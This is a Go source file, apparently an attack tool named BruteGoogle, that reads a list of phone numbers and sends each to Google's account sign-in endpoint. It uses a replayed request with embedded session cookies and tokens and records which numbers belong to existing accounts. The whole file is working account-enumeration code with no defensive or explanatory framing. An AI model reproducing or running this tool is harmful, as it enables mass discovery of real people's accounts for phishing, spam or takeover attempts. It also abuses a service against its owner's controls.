package bruteforceSite

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func BruteGoogle() {

	numberphones := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		numberphones = append(numberphones, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	url := "https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute"
	for _, numberphone := range numberphones {
		data := []byte(`f.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22` + numberphone + `%5C%22%2C1%2Cnull%2Cnull%2C1%2C1%2Cnull%2Cnull%2C%5C%22S1024001171%3A1702789436450024%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2C%5C%22mail%5C%22%2Cnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%2Cnull%2C%5C%22%5C%22%2C%5C%22BR%5C%22%2C%5Bnull%2Cnull%2C%5C%22S1024001171%3A1702789436450024%5C%22%2C%5C%22ServiceLogin%5C%22%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%2C%5B%5B%5C%22continue%5C%22%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%2C%5B%5C%22emr%5C%22%2C%5C%221%5C%22%5D%2C%5B%5C%22followup%5C%22%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%2C%5B%5C%22ifkv%5C%22%2C%5C%22ASKXGp33dt23fCSsQpC-AknMrz4UgHDeOpnoLnijv9JAhEPn3pzVkwTe34fwgzXcQFmz32nK9cqN5g%5C%22%5D%2C%5B%5C%22osid%5C%22%2C%5C%221%5C%22%5D%2C%5B%5C%22passive%5C%22%2C%5C%221209600%5C%22%5D%2C%5B%5C%22service%5C%22%2C%5C%22mail%5C%22%5D%2C%5B%5C%22flowName%5C%22%2C%5C%22GlifWebSignIn%5C%22%5D%2C%5B%5C%22flowEntry%5C%22%2C%5C%22ServiceLogin%5C%22%5D%2C%5B%5C%22dsh%5C%22%2C%5C%22S1024001171%3A1702789436450024%5C%22%5D%2C%5B%5C%22theme%5C%22%2C%5C%22glif%5C%22%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22glif%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C%5B%5C%22youtube%3A353%5C%22%2C%5C%22youtube%5C%22%2C1%5D%2Cnull%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C7%2Cnull%2C%5B%5B%5C%22identity-signin-identifier%5C%22%2C%5C%22!np2lncXNAAYd8nJvPfJCdxhCGE0Bbog7ADQBEArZ1A0Rz739l3KEPFUtr8lxYxndre98p6HfFXNoTGIWNwvUsoYx91x9Jclb7CqWiC5nAgAAAF1SAAAARGgBB5kD4ZBj2yflaJgXsjfSlLYilrVMkmjsNJcdELZuT1_-JHRduP5sacnhKGRZAYhZHvun3gxObU42wquNeSY8GG2_cvxg3YlH8ihQupZl0V49ZuY9AyM_pycHQQVy6FD_qjpWdkDXTjQH03Fn-APaCI-jeLX_vdi8Ez7BHrKygPn5KA7ABw6s8AWhDCqg6g4qd1_IPvZHRMBAQ76aAP6cG1G0yBy6lV2Ro6KueiciKlgwGD4vVM_zI5gXwVZdJA0uWHwvOdPDwNle6oy6m2u_bwiNzjx9j52-8T1lmxLfLfM9AO0gVGfHEeF1JSpkdJ_fMooiZLVpHyNdgPhoIukcqmABtR-0ZjeI3aKGoHtK3WO9wzh0d84iuWNGc_0B-ng-gUD7PfpzLk0wjYiiGpE5UP4GOTpDTFtygvu2UHw5RooYarrrhFWCtqM3FevMUS7i7DyKx8Vlt9ftQYemAc0R6RBKM7DXapKPsaLlqPz_9Q0zLp5DoiZLwjdWjPEMrQ_Do60Gc84V-UCJTeNhR3xUcjt7psSbzxxTiOz1bdKGD7dZ833eebkJZXepSVv5c5epyaThKnrMi2ikypGCEC9A0FIeXD1g_K_fufF5qLRp9QV-jIcmn9uYBL3nO8O-oNdJHnbIWAa0W_TZ1PmmcJj8YCE5oEEkCVY0PBLy9tJQqE8Ed-UDkVmvlAK-WHXB1loAYDlhn4BkF4JkR7jHpLhoA-tDFobOnpfXWiQRaUR2Kqmo4MXerVFrGrKbPddZAWxsSREthwG7XD6lrU7aA7Uig_Cuz3SU58XTL0nRPIxCuSa1jvxONztQASqpOsbFASy-ulioXKEcN0mf8s4H-g8Hh_psYmVzLZ_aGXLmRWrh--KIcYJH1buGvz6oI4SUsYgalyQCEwJkmaPWETomOV4P_ae_rPBdzY_lFCn9lYQlqTZNYqIBkSILr-LeACrJmKqSaD02zzulKreviBg0LAHQQwYs8thYISHHS3YxjwcSAV_8BFzQtvoZF6fvZTfesW7hhLTQal4Ofl4J_J7f0rBxqCEw9xfV_a2OV5aKZuEZy45n3mZjeGjqI7uq6OGzth6TmQ4OwXh2ybY6Eyl4wgJ3EOSx0QdbuTwx5z27l_-AQencVX-4UMpR8b9UNj6jwD9jKnnN3cDe-EAwsTfvpI8rQ_pMRX4Fn9pTaXvH3UXKYcumYNqScxlB8C5yfOmgSCyIMD68tNeInfXdopVA6EEG4yJdB9-_gsq18_FZAo9TUTJovgXx7iNJU9MqD9OP4-t7P6z6KkpmoR-P5IahVv7xH54f6LegGXbqHAJ23orIAbgnAL6TRw%5C%22%5D%5D%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2C%5B%5B%5C%22continue%5C%22%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%5D%2C%5B%5C%22emr%5C%22%2C%5B%5C%221%5C%22%5D%5D%2C%5B%5C%22followup%5C%22%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%5D%2C%5B%5C%22ifkv%5C%22%2C%5B%5C%22ASKXGp33dt23fCSsQpC-AknMrz4UgHDeOpnoLnijv9JAhEPn3pzVkwTe34fwgzXcQFmz32nK9cqN5g%5C%22%5D%5D%2C%5B%5C%22osid%5C%22%2C%5B%5C%221%5C%22%5D%5D%2C%5B%5C%22passive%5C%22%2C%5B%5C%221209600%5C%22%5D%5D%2C%5B%5C%22service%5C%22%2C%5B%5C%22mail%5C%22%5D%5D%2C%5B%5C%22flowName%5C%22%2C%5B%5C%22GlifWebSignIn%5C%22%5D%5D%2C%5B%5C%22flowEntry%5C%22%2C%5B%5C%22ServiceLogin%5C%22%5D%5D%2C%5B%5C%22dsh%5C%22%2C%5B%5C%22S1024001171%3A1702789436450024%5C%22%5D%5D%2C%5B%5C%22theme%5C%22%2C%5B%5C%22glif%5C%22%5D%5D%5D%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%2Cnull%2C%5C%22S1024001171%3A1702789436450024%5C%22%2Cnull%2Cnull%2C%5B%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=ALt4Ve3P_g9GH-AZ45JXGhWIZEoM%3A1702789444179&`)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Set("Cookie", "__Host-GAPS=1:BwqSMFHn6wKGDXlj7_saRyjKY7vEXQ:RVQE4HbmHoPm8vI-; OTZ=7341424_68_64_73560_68_416340; NID=511=KwpgypjJAjFHcQv1FEARz64tXyxPd6-eFYD2ffiK47x1bQrNdqFirIYzR0LTcC-SY8-SjP7f6wOGP-Ot9Xph4rmL0L7WNNPd94neK94_Ur7Jjt0e20jdKqX0c2bcVU79jsgdJNAzYYRsGrT8b3k6BecLOI79fViTAoka4SwKIaQ")
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Referer", "https://accounts.google.com/")
		req.Header.Set("X-Same-Domain", "1")
		req.Header.Set("X-Goog-Ext-278367001-Jspb", `["GlifWebSignIn"]`)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded;charset=utf-8")
		req.Header.Set("Content-Length", "4231")
		req.Header.Set("Origin", "https://accounts.google.com")
		req.Header.Set("Dnt", "1")
		req.Header.Set("Sec-Gpc", "1")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		req.Header.Set("Te", "trailers")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		gz, err := gzip.NewReader(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		defer gz.Close()

		body, err := ioutil.ReadAll(gz)
		if err != nil {
			log.Fatal(err)
		}

		if strings.Contains(string(body), numberphone) {
			fmt.Println("[+] Numberphone Exist:", numberphone)
			WriteToFile("numbers-google.txt", numberphone+"\n", "./numberphone/")
		} else {
			fmt.Println("[-] Not Exist:", numberphone)
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func WriteToFile(filename string, data string, folderName string) error {
	os.MkdirAll(folderName, os.ModePerm)
	filename = filepath.Join(folderName, filename)
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err := f.WriteString(data); err != nil {
		return err
	}
	return nil
}
